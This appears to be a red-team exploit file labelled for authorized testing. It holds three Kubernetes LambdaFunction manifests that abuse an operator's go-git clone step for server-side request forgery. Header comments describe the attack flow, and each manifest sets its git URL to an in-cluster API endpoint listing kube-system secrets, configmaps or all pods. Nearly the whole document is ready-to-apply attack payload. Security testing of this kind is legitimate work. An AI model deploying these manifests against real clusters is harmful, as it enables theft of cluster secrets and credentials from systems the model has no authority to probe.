# BLUE-001: SSRF via Go-Git - Kubernetes API
# ⚠️ AUTHORIZED TESTING ONLY
#
# This exploit attempts to access the Kubernetes API server
# to retrieve secrets and other sensitive resources.
#
# Attack Flow:
# 1. Create LambdaFunction with git.url pointing to K8s API
# 2. Operator's go-git attempts to "clone" the URL
# 3. HTTP request made to kubernetes.default.svc
# 4. API response captured in build context
# 5. Attacker extracts secret data
---
apiVersion: lambda.knative.io/v1alpha1
kind: LambdaFunction
metadata:
  name: blue-001-k8s-secrets-ssrf
  labels:
    redteam: "true"
    exploit: "blue-001"
    target: "k8s-secrets"
  annotations:
    redteam.knative.io/description: "SSRF to Kubernetes secrets API"
spec:
  source:
    type: git
    git:
      # SSRF payload - Kubernetes API secrets endpoint
      url: "https://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets"
      ref: "main"
  runtime:
    language: python
    version: "3.11"
    handler: "main.handler"
---
apiVersion: lambda.knative.io/v1alpha1
kind: LambdaFunction
metadata:
  name: blue-001-k8s-configmaps-ssrf
  labels:
    redteam: "true"
    exploit: "blue-001"
    target: "k8s-configmaps"
spec:
  source:
    type: git
    git:
      # SSRF payload - Kubernetes ConfigMaps
      url: "https://kubernetes.default.svc/api/v1/namespaces/default/configmaps"
      ref: "main"
  runtime:
    language: python
    version: "3.11"
    handler: "main.handler"
---
apiVersion: lambda.knative.io/v1alpha1
kind: LambdaFunction
metadata:
  name: blue-001-k8s-pods-ssrf
  labels:
    redteam: "true"
    exploit: "blue-001"
    target: "k8s-pods"
spec:
  source:
    type: git
    git:
      # SSRF payload - List all pods
      url: "https://kubernetes.default.svc/api/v1/pods"
      ref: "main"
  runtime:
    language: python
    version: "3.11"
    handler: "main.handler"
